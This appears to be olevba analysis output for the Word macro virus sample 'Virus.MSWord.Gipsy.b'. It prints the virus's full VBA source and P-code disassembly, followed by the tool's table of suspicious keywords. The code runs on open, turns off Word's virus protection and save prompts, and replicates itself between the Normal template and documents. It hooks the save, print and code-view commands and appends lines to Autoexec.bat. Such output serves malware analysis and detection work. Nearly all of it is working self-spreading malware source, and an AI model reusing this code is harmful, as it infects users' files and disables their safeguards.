olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Gipsy.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Gipsy.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO GIPSY.bas 
in file: Virus.MSWord.Gipsy.b - OLE stream: 'Macros/VBA/GIPSY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
WrittenBy = "Lord Arz"
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    NormalTemplate.VBProject.VBComponents(i).Export "C:\Gen.dat"
    Open "C:\Gen.dat" For Input As #1
    Do
    Line Input #1, NormInstalled
    Loop Until Left(NormInstalled, 3) = "Sub" Or Left(NormInstalled, 7) = "VERSION"
    Line Input #1, NormInstalled
    Line Input #1, DocInstalled
    Line Input #1, DocThere
    If NormInstalled = "Application.EnableCancelKey = wdCancelDisabled" And DocInstalled = "WordBasic.DisableAutoMacros 0" And DocThere = "Options.VirusProtection = False" Then
        Close #1
        Kill "C:\Gen.dat"
        Call Payload
    GoTo ErrorAO
    End If
    Close #1
Next i

For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    ActiveDocument.VBProject.VBComponents(x).Export "C:\Gen.dat"
    Open "C:\Gen.dat" For Input As #1
    Do
    Line Input #1, NormInstalled
    Loop Until Left(NormInstalled, 3) = "Sub" Or Left(NormInstalled, 7) = "VERSION"
    Line Input #1, NormInstalled
    Line Input #1, DocInstalled
    Line Input #1, DocThere
    If NormInstalled = "Application.EnableCancelKey = wdCancelDisabled" And DocInstalled = "WordBasic.DisableAutoMacros 0" And DocThere = "Options.VirusProtection = False" Then
        Close #1
        Kill "C:\Gen.dat"
        GoTo InfectionStart
    End If
    Close #1
Next x
InfectionStart:
Randomize (Int(Timer * Timer / Int(Rnd * Timer)))
NormInstalled = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65)
DocInstalled = ActiveDocument.VBProject.VBComponents(x).Name
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=DocInstalled, Object:=wdOrganizerObjectProjectItems
Application.OrganizerRename Source:=NormalTemplate.FullName, Name:=DocInstalled, NewName:=NormInstalled, Object:=wdOrganizerObjectProjectItems
ErrorAO:
End Sub
Sub Payload()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize Timer
i = Int(Rnd * 10)
Select Case i
Case Is <= 3
With Assistant.NewBalloon
    .Heading = "The Gipsy Virus:"
    .Text = "Copy me, I like to travel"
    .Show
End With
Case Is >= 4
Open "C:\Autoexec.bat" For Append As #1
Print #1, "@echo off"
For x = 1 To 20
Print #1, "echo Help me I'm sick >>C:\Computer." & "V" & Chr(255) & Chr(219)
Next x
Close #1
End Select
If Left(Date, 5) = "24.12" Then
With Assistant.NewBalloon
    .Heading = "BiologicBeast Virus:"
    .Text = "Mary Christmas...     don't work at this day"
    .Show
End With
ThisDocument.Save
ThisDocument.Close
End If
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    NormalTemplate.VBProject.VBComponents(x).Export "C:\Gen.dat"
    Open "C:\Gen.dat" For Input As #1
    Line Input #1, WhoAmI
    Line Input #1, WhoAmI
    Line Input #1, NormInstalled
    Line Input #1, NormReadOnly
    Line Input #1, DocInstalled
    Line Input #1, DocThere
    If NormInstalled = "Sub AutoOpen()" And NormReadOnly = "Application.EnableCancelKey = wdCancelDisabled" And DocInstalled = "WordBasic.DisableAutoMacros 0" And DocThere = "Options.VirusProtection = False" Then
    Close #1
    Kill "C:\Gen.dat"
    GoTo InfectionStart
    End If
Close #1
Next x
InfectionStart:
Randomize (Int(Timer * Timer / Int(Rnd * Timer)))
DocInstalled = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65)
NormInstalled = NormalTemplate.VBProject.VBComponents(x).Name
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=NormInstalled, Object:=wdOrganizerObjectProjectItems
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=NormInstalled, NewName:=DocInstalled, Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub FilePrint()
On Error Resume Next
Selection.MoveEnd
Selection.Text = Chr(13) & "...help me, I'm sick"
Dialogs(wdDialogFilePrint).Show
Selection.Delete
End Sub
Sub ViewVBCode()
Call Payload
End Sub
Sub ToolsMacro()
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Gipsy.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/GIPSY - 7627 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitStr 0x0008 "Lord Arz"
' 	St WrittenBy 
' Line #6:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #7:
' 	LitStr 0x000A "C:\Gen.dat"
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #8:
' 	LitStr 0x000A "C:\Gen.dat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #9:
' 	Do 
' Line #10:
' 	LitDI2 0x0001 
' 	Ld NormInstalled 
' 	LineInput 
' Line #11:
' 	Ld NormInstalled 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Eq 
' 	Ld NormInstalled 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "VERSION"
' 	Eq 
' 	Or 
' 	LoopUntil 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormInstalled 
' 	LineInput 
' Line #13:
' 	LitDI2 0x0001 
' 	Ld DocInstalled 
' 	LineInput 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld DocThere 
' 	LineInput 
' Line #15:
' 	Ld NormInstalled 
' 	LitStr 0x002E "Application.EnableCancelKey = wdCancelDisabled"
' 	Eq 
' 	Ld DocInstalled 
' 	LitStr 0x001D "WordBasic.DisableAutoMacros 0"
' 	Eq 
' 	And 
' 	Ld DocThere 
' 	LitStr 0x001F "Options.VirusProtection = False"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #17:
' 	LitStr 0x000A "C:\Gen.dat"
' 	ArgsCall Kill 0x0001 
' Line #18:
' 	ArgsCall (Call) Payload 0x0000 
' Line #19:
' 	GoTo ErrorAO 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #22:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #23:
' Line #24:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #25:
' 	LitStr 0x000A "C:\Gen.dat"
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #26:
' 	LitStr 0x000A "C:\Gen.dat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #27:
' 	Do 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld NormInstalled 
' 	LineInput 
' Line #29:
' 	Ld NormInstalled 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Eq 
' 	Ld NormInstalled 
' 	LitDI2 0x0007 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0007 "VERSION"
' 	Eq 
' 	Or 
' 	LoopUntil 
' Line #30:
' 	LitDI2 0x0001 
' 	Ld NormInstalled 
' 	LineInput 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld DocInstalled 
' 	LineInput 
' Line #32:
' 	LitDI2 0x0001 
' 	Ld DocThere 
' 	LineInput 
' Line #33:
' 	Ld NormInstalled 
' 	LitStr 0x002E "Application.EnableCancelKey = wdCancelDisabled"
' 	Eq 
' 	Ld DocInstalled 
' 	LitStr 0x001D "WordBasic.DisableAutoMacros 0"
' 	Eq 
' 	And 
' 	Ld DocThere 
' 	LitStr 0x001F "Options.VirusProtection = False"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #35:
' 	LitStr 0x000A "C:\Gen.dat"
' 	ArgsCall Kill 0x0001 
' Line #36:
' 	GoTo InfectionStart 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #39:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #40:
' 	Label InfectionStart 
' Line #41:
' 	Ld Timer 
' 	Ld Timer 
' 	Mul 
' 	Ld Rnd 
' 	Ld Timer 
' 	Mul 
' 	FnInt 
' 	Div 
' 	FnInt 
' 	Paren 
' 	ArgsCall Read 0x0001 
' Line #42:
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St NormInstalled 
' Line #43:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St DocInstalled 
' Line #44:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld DocInstalled 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #45:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld DocInstalled 
' 	ParamNamed New 
' 	Ld NormInstalled 
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #46:
' 	Label ErrorAO 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub Payload())
' Line #49:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #50:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #51:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #52:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #53:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #54:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	St i 
' Line #55:
' 	Ld i 
' 	SelectCase 
' Line #56:
' 	LitDI2 0x0003 
' 	CaseLe 
' 	CaseDone 
' Line #57:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #58:
' 	LitStr 0x0010 "The Gipsy Virus:"
' 	MemStWith Heading 
' Line #59:
' 	LitStr 0x0019 "Copy me, I like to travel"
' 	MemStWith Then 
' Line #60:
' 	ArgsMemCallWith Show 0x0000 
' Line #61:
' 	EndWith 
' Line #62:
' 	LitDI2 0x0004 
' 	CaseGe 
' 	CaseDone 
' Line #63:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #65:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	For 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "echo Help me I'm sick >>C:\Computer."
' 	LitStr 0x0001 "V"
' 	Concat 
' 	LitDI2 0x00FF 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x00DB 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #67:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #69:
' 	EndSelect 
' Line #70:
' 	Ld Date 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "24.12"
' 	Eq 
' 	IfBlock 
' Line #71:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #72:
' 	LitStr 0x0014 "BiologicBeast Virus:"
' 	MemStWith Heading 
' Line #73:
' 	LitStr 0x002C "Mary Christmas...     don't work at this day"
' 	MemStWith Then 
' Line #74:
' 	ArgsMemCallWith Show 0x0000 
' Line #75:
' 	EndWith 
' Line #76:
' 	Ld ThisDocument 
' 	ArgsMemCall Save 0x0000 
' Line #77:
' 	Ld ThisDocument 
' 	ArgsMemCall Close 0x0000 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Sub FileSaveAs())
' Line #81:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #82:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #83:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #84:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #85:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #86:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #87:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #90:
' 	LitStr 0x000A "C:\Gen.dat"
' 	Ld x 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #91:
' 	LitStr 0x000A "C:\Gen.dat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #92:
' 	LitDI2 0x0001 
' 	Ld WhoAmI 
' 	LineInput 
' Line #93:
' 	LitDI2 0x0001 
' 	Ld WhoAmI 
' 	LineInput 
' Line #94:
' 	LitDI2 0x0001 
' 	Ld NormInstalled 
' 	LineInput 
' Line #95:
' 	LitDI2 0x0001 
' 	Ld NormReadOnly 
' 	LineInput 
' Line #96:
' 	LitDI2 0x0001 
' 	Ld DocInstalled 
' 	LineInput 
' Line #97:
' 	LitDI2 0x0001 
' 	Ld DocThere 
' 	LineInput 
' Line #98:
' 	Ld NormInstalled 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Eq 
' 	Ld NormReadOnly 
' 	LitStr 0x002E "Application.EnableCancelKey = wdCancelDisabled"
' 	Eq 
' 	And 
' 	Ld DocInstalled 
' 	LitStr 0x001D "WordBasic.DisableAutoMacros 0"
' 	Eq 
' 	And 
' 	Ld DocThere 
' 	LitStr 0x001F "Options.VirusProtection = False"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #99:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #100:
' 	LitStr 0x000A "C:\Gen.dat"
' 	ArgsCall Kill 0x0001 
' Line #101:
' 	GoTo InfectionStart 
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #104:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	Label InfectionStart 
' Line #106:
' 	Ld Timer 
' 	Ld Timer 
' 	Mul 
' 	Ld Rnd 
' 	Ld Timer 
' 	Mul 
' 	FnInt 
' 	Div 
' 	FnInt 
' 	Paren 
' 	ArgsCall Read 0x0001 
' Line #107:
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St DocInstalled 
' Line #108:
' 	Ld x 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NormInstalled 
' Line #109:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld NormInstalled 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #110:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormInstalled 
' 	ParamNamed New 
' 	Ld DocInstalled 
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #111:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #112:
' 	EndSub 
' Line #113:
' 	FuncDefn (Sub FilePrint())
' Line #114:
' 	OnError (Resume Next) 
' Line #115:
' 	Ld Selection 
' 	ArgsMemCall MoveEnd 0x0000 
' Line #116:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0014 "...help me, I'm sick"
' 	Concat 
' 	Ld Selection 
' 	MemSt Then 
' Line #117:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #118:
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0000 
' Line #119:
' 	EndSub 
' Line #120:
' 	FuncDefn (Sub ViewVBCode())
' Line #121:
' 	ArgsCall (Call) Payload 0x0000 
' Line #122:
' 	EndSub 
' Line #123:
' 	FuncDefn (Sub ToolsMacro())
' Line #124:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

